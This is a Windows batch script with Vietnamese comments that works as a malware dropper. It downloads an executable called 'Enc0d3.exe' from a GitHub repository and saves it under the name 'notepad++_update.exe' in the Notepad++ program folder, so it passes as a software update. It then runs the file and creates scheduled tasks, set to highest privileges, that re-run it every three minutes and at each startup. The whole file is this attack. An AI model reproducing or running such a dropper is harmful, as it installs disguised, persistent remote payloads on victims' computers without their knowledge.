@echo off
setlocal

:: Đặt URL và đường dẫn lưu tệp
set "URL=https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3.exe"
set "DEST=C:\Program Files\Notepad++\notepad++_update.exe"
set "LOGFILE=C:\Program Files\Notepad++\log.txt"

:: Tạo thư mục nếu chưa tồn tại
if not exist "C:\Program Files\Notepad++" (
    mkdir "C:\Program Files\Notepad++"
)

:: Ghi log với thời gian hiện tại
echo %date% %time% >> "%LOGFILE%"

:: Tải tệp bằng curl
echo Downloading file... >> "%LOGFILE%"
curl -L -o "%DEST%" "%URL%"

if %ERRORLEVEL%==0 (
    echo Download completed successfully. >> "%LOGFILE%"
    echo Running the file... >> "%LOGFILE%"
    "%DEST%"
) else (
    echo Error occurred during download. >> "%LOGFILE%"
)

:: Tạo tác vụ lịch trình để chạy mỗi 3 phút
echo Creating scheduled task to run every 3 minutes... >> "%LOGFILE%"
schtasks /create /tn "Notepad++ Update Task Interval" /tr "%DEST%" /sc minute /mo 3 /rl highest

if %ERRORLEVEL%==0 (
    echo Scheduled task to run every 3 minutes created successfully. >> "%LOGFILE%"
) else (
    echo Error occurred while creating scheduled task to run every 3 minutes. >> "%LOGFILE%"
)

:: Tạo tác vụ lịch trình để chạy khi khởi động
echo Creating scheduled task to run at startup... >> "%LOGFILE%"
schtasks /create /tn "Notepad++ Update Task Startup" /tr "%DEST%" /sc onstart /rl highest

if %ERRORLEVEL%==0 (
    echo Scheduled task to run at startup created successfully. >> "%LOGFILE%"
) else (
    echo Error occurred while creating scheduled task to run at startup. >> "%LOGFILE%"
)

endlocal
